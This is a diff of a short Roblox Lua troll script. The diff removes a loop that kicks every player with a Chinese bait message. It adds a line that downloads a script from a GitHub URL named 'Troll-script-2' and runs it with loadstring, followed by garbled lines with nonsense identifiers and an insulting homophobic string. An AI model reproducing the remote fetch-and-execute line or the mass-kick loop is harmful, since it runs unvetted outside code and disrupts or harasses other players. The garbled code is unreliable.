@@ -1,5 +1,6 @@
-for _, player in pairs(game.Players:GetPlayers()) do
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Jskfhggjxu/My-Script/refs/heads/main/Troll-script-2"))()
+Tory ToryTory in pairs(game.Players:GetPlayers()) do
 
- player:Kick("老弟你还真信啊 看到这个去找群叫Jskfhggjxu的管理员要礼物")
-
+ ToryTory:ToryToryTory("YOUAREGAYGAY")
+ 
 end
